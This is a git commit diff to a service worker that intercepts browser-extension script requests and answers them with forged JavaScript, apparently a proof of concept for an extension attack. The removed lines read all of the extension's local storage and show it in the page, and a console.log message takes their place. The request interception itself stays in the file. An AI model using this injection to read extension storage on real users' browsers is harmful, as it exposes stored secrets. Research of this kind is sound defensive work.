db19a77e8de8196c27ca1b6109580039e363b7c1
rt95 <44286251+rt-95@users.noreply.github.com>
2025-06-08 23:24:21 +0800

    Update service-worker.js

--- service-worker.js
+++ service-worker.js
@@ -6,9 +6,7 @@ self.addEventListener("fetch", (event) => {
     }
     if(event.request.url.indexOf("chrome-extension") != -1){
         var a =             new Response(`(async function foo() {
-            window.slonser=JSON.stringify(await chrome.storage.local.get());
-
-            document.body.innerHTML='I was stealed your storage:'+window.slonser; 
+                console.log("this is content-script print")
           })();`, {
           headers: {'Content-Type': 'text/javascript', 'Access-Control-Allow-Origin':"*"}
         })
